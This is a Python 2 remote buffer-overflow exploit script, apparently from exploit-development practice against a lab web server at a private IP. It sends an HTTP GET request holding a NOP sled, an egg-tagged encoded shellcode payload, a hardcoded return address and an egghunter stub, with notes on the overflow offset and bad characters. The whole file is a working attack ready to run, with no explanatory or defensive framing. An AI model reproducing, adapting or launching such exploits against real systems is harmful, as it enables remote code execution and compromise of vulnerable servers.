#!/usr/bin/env python
import socket

# position 515
# ret addr 0x77def069

#second shellcode position =  31

# egghunter \x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x49\x4E\x53\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7

#badchars \x20\x3f

shellcode =  "\xbe\x05\x90\x68\x9e\xda\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x83\xc0\x04\x31\x70\x0e\x03\x75\x9e\x8a\x6b\x89\x76\xc8\x94\x71\x87\xad\x1d\x94\xb6\xed\x7a\xdd\xe9\xdd\x09\xb3\x05\x95\x5c\x27\x9d\xdb\x48\x48\x16\x51\xaf\x67\xa7\xca\x93\xe6\x2b\x11\xc0\xc8\x12\xda\x15\x09\x52\x07\xd7\x5b\x0b\x43\x4a\x4b\x38\x19\x57\xe0\x72\x8f\xdf\x15\xc2\xae\xce\x88\x58\xe9\xd0\x2b\x8c\x81\x58\x33\xd1\xac\x13\xc8\x21\x5a\xa2\x18\x78\xa3\x09\x65\xb4\x56\x53\xa2\x73\x89\x26\xda\x87\x34\x31\x19\xf5\xe2\xb4\xb9\x5d\x60\x6e\x65\x5f\xa5\xe9\xee\x53\x02\x7d\xa8\x77\x95\x52\xc3\x8c\x1e\x55\x03\x05\x64\x72\x87\x4d\x3e\x1b\x9e\x2b\x91\x24\xc0\x93\x4e\x81\x8b\x3e\x9a\xb8\xd6\x56\x6f\xf1\xe8\xa6\xe7\x82\x9b\x94\xa8\x38\x33\x95\x21\xe7\xc4\xda\x1b\x5f\x5a\x25\xa4\xa0\x73\xe2\xf0\xf0\xeb\xc3\x78\x9b\xeb\xec\xac\x0c\xbb\x42\x1f\xed\x6b\x23\xcf\x85\x61\xac\x30\xb5\x8a\x66\x59\x5c\x71\xe1\xa6\x09\x06\x72\x4e\x48\xf8\x65\xd3\xc5\x1e\xef\xfb\x83\x89\x98\x62\x8e\x41\x38\x6a\x04\x2c\x7a\xe0\xab\xd1\x35\x01\xc1\xc1\xa2\xe1\x9c\xbb\x65\xfd\x0a\xd3\xea\x6c\xd1\x23\x64\x8d\x4e\x74\x21\x63\x87\x10\xdf\xda\x31\x06\x22\xba\x7a\x82\xf9\x7f\x84\x0b\x8f\xc4\xa2\x1b\x49\xc4\xee\x4f\x05\x93\xb8\x39\xe3\x4d\x0b\x93\xbd\x22\xc5\x73\x3b\x09\xd6\x05\x44\x44\xa0\xe9\xf5\x31\xf5\x16\x39\xd6\xf1\x6f\x27\x46\xfd\xba\xe3\x76\xb4\xe6\x42\x1f\x11\x73\xd7\x42\xa2\xae\x14\x7b\x21\x5a\xe5\x78\x39\x2f\xe0\xc5\xfd\xdc\x98\x56\x68\xe2\x0f\x56\xb9"

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x49\x4e\x53\x48\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

buff =  "GET /" + "\x90" * 31 + "INSHINSH" +  "\x90" * 16 + shellcode + "\x90" * (515 - 31 - 8 - 16 - len(shellcode)) + "\x69\xf0\xde\x77" + egghunter + "C" * (600 - 515 - 4 - len(egghunter)) + " HTTP/1.0\r\n\r\n" 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(("192.168.127.130",8080))
s.send(buff)
print s.recv(1024)
s.close()
